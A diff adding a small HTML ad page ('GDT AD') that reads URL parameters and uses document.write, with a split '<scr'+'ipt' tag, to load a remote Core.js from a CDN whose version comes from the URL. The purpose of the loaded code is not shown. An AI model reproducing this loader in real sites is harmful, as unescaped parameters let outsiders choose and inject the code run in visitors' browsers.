@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+    <head>
+	<title>GDT AD</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    </head>
+    <body>
+	
+<script>
+function getParameter(name, cancelBubble) {
+            var r = new RegExp("(\\?|#|&)" + name + "=([^&#]*)(&|#|$)");
+            var m = location.href.match(r);
+            if ((!m || m == "") && !cancelBubble) m = window.location.href.match(r);
+            return (!m ? "" : m[2]);
+        }
+
+
+</script>
+	
+	<script>
+	    window.s_w = getParameter('s_w');
+		window.sys_trackid = getParameter('trackid');
+		var ver_id = getParameter('ver_id');
+	</script>
+
+<script type="text/javascript">
+
+
+
+// var webpath = "Core_Source.js";
+// var webpath = "//cdn.jsdelivr.net/gh/lhtel/cdn@100312/Master/Core.js";
+var webpath = "//cdn.jsdelivr.net/gh/lhtel/cdn@"+ver_id+"/Master/Core.js";
+// var webpath = "//etc.6187wo.com/Master/Core.js";
+document.write('<scr'+'ipt src="'+webpath+'" id="'+s_w+'" tag='+s_w+'"></scr'+'ipt>');
+</script>
+    </body>
+</html>
